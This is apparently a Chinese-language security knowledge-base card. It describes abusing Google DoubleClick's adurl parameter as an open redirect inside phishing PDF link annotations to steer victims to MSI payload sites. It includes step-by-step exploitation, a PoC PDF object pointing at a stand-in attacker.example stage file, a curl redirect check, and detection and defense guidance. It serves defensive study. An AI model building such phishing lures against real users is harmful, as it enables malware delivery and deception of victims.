---
id: web-generic-open-redirect-doubleclick-adurl-pdf-phishing
title: Google DoubleClick adurl 开放重定向：钓鱼 PDF 内嵌广告点击链接把受害者导向恶意 MSI 站点
type: scenario
domain: web
path: web/generic/open-redirect
technique: doubleclick-adurl-open-redirect
aliases:
- adclick.g.doubleclick.net 开放重定向
- adurl 参数跳转
- DoubleClick 广告点击链接滥用
- PDF /URI 钓鱼按钮
- Google Ads 重定向洗白
- 广告域名信任滥用
tags:
- open-redirect
- google-ads
- doubleclick
- pdf
- phishing
- redirector
- lots
- initial-access
- windows
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-11'
verification:
  verified_by: verifier-V493
  verified_at: '2026-11-11T00:00:38+08:00'
  notes: 已对照原文与图02/03核对：钓鱼 PDF 的 /Subtype /Link 注释内 /URI 指向 adclick.g.doubleclick.net/pcs/click?...&adurl=，解密的 HTTP/2 请求链与原文一致；与既有站点 url 参数类、二维码分享类开放重定向卡场景不同。未验证点：卡片已用 <click-params> 占位，未实测 adclick 端点当前是否仍按 adurl 跳转；原文未给版本；frontmatter 无 sources/source_url
---

## 一句话结论

Google 广告点击端点 `https://adclick.g.doubleclick.net/pcs/click?...&adurl=<目标URL>` 会把用户 302 到 `adurl` 指定的任意地址；把这个链接放进钓鱼 PDF 的链接注释/按钮里，受害者点击后浏览器先访问高信誉的 Google 广告域名、再跳到攻击者站点，URL 信誉与邮件网关看到的是一条“Google 广告点击”链，而不是恶意外链。

## 原理

- **`adurl` 是广告点击后的落地地址参数**：DoubleClick 的 `/pcs/click` 端点用于记录广告点击并把用户导向广告主配置的目标，`adurl` 就是该目标 URL。端点按点击参数执行重定向，通常只校验自身签名/活动 ID，不校验 `adurl` 指向的域是否是广告主备案域，因此可被当作开放重定向使用。
- **PDF 的链接不一定要显示完整 URL**：PDF 可以用 `/Annots` 里的 `/Subtype /Link` 注释挂 `/A << /URI (...) >>` 动作；阅读器把按钮/文字渲染成正常文档内容，用户点击时打开的是注释里的真实 URI，与显示文本可以完全无关。
- **为什么能扩大影响**：初始链接落在 `doubleclick.net`/`google.com` 这类高信誉域，邮件网关、代理和 URL 信誉通常不会拦截；TLS 流量是 HTTP/2，明文里能看到 `adurl` 参数但内容被加密，只有解密后才能还原完整跳转链。攻击者还可购买广告位、滥用搜索广告或直接构造点击 URL，把恶意流量混入正常广告点击。
- **与利用链的关系**：开放重定向本身只完成“可信域跳转”，真正的代码执行要靠落地页再投递 `.url`/LNK/PDF 等，并常与 SmartScreen 安全特性绕过（如 CVE-2024-21412、CVE-2023-36025）组合；Open Redirect 在这里的作用是“洗白入口 + 扩大可点击面”。

## 触发条件

- 攻击者能构造带有效点击参数的 `adclick.g.doubleclick.net/pcs/click?...&adurl=...` URL（活动 ID、点击 ID 等参数可来自真实广告点击或自行拼装）。
- 受害者使用 PDF 阅读器打开钓鱼文档并点击其中的链接/按钮；阅读器允许打开外部 URI。
- 受害者网络可访问 Google 广告域；出站 HTTPS/HTTP2 未被完全阻断。
- `adurl` 目标站点由攻击者控制，且可承载下一阶段载荷（恶意 `.url`、MSI、钓鱼页等）。

## 利用步骤

1. **准备落地链**：在攻击者站点/WebDAV 上放置下一阶段（如 `.url` → WebDAV → MSI 的投递链）。
2. **构造广告点击 URL**：取一个 `adclick.g.doubleclick.net/pcs/click?<活动/点击参数>&adurl=<落地URL>` 形式，把 `adurl` 设为落地链入口；必要时对 `adurl` 做 URL 编码。
3. **嵌入 PDF**：在 PDF 页面中放置按钮或链接，挂 `/Subtype /Link` 注释，`/A << /URI (https://adclick.g.doubleclick.net/pcs/click?...&adurl=...) >>`；按钮文字伪装成“下载/打开文档/安装更新”。
4. **分发**：通过邮件、即时通讯或社交平台投递 PDF；用户点击后先经过 Google 广告域，再跳到攻击者站点。
5. **验证**：解密 HTTP/2 流量或用代理抓包，确认 302 链为 `adclick.g.doubleclick.net` → `adurl` 目标；检查 PDF 注释里的 URI 与页面显示文字不一致。

## PoC

PDF 链接注释结构（参数做占位，实际活动/点击参数按需获取）：

```text
4 0 obj
<< /A << /URI (https://adclick.g.doubleclick.net/pcs/click?<click-params>&adurl=https%3A%2F%2Fattacker.example%2Fstage.url)
      /S /URI >>
   /Border [0 0 0]
   /Subtype /Link
>>
endobj
```

验证跳转链（在隔离环境，不访问真实恶意落地）：

```bash
curl -sk -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  'https://adclick.g.doubleclick.net/pcs/click?<click-params>&adurl=https://example.com/'
```

无独立恶意样本 PoC；核心是 `adurl` 参数与 PDF 注释的组合。

## 变体与关联

- **其他高信誉重定向服务**：mock API（mocky.io）、webhook 测试服务、短链、云存储跳转、OAuth/SSO 回调跳转等都可充当 LOTS 重定向器；本卡的区别是广告点击端点自带“真实广告流量”掩护。
- **入口载体**：PDF 注释之外，还可放在邮件 HTML 按钮、QR 码、Office 文档超链接、日历邀请中。
- **与安全特性绕过组合**：重定向落地到 `.url`/LNK/`.msi` 投递链，配合 CVE-2024-21412、CVE-2023-36025 等 MotW/SmartScreen 绕过完成执行；开放重定向单独通常只算钓鱼跳板。
- **广告平台滥用**：购买搜索广告/赞助帖子直接投递恶意安装包，与“开放重定向”是同一信任面的两种用法。

## 检测与防御

- **PDF 审计**：批量提取 `/Annots` 中的 `/URI` 动作，对 URL 主机为广告/点击域且带 `adurl`、`redirect`、`url` 等参数的外链告警；显示文字与 URI 不一致的按钮重点检查。
- **网络侧**：代理/网关对 `adclick.g.doubleclick.net` 等广告点击域的出站请求做记录；解密 HTTP/2 后提取 `adurl` 目标并做信誉判定；阻断到未知 WebDAV/IP 的后续跳转。
- **邮件侧**：附件为 PDF 时做链接抽取与沙箱点击；不因链接主机是 Google 域名就放行，检查完整重定向链。
- **终端侧**：浏览器下载 `.url`/`.msi` 后检查 MotW 与 SmartScreen 行为；监控 `msiexec` 从浏览器/临时目录启动。
- **用户侧**：不在 PDF 中点击“下载/安装”按钮；对跳转到软件下载页的广告链接保持警惕。
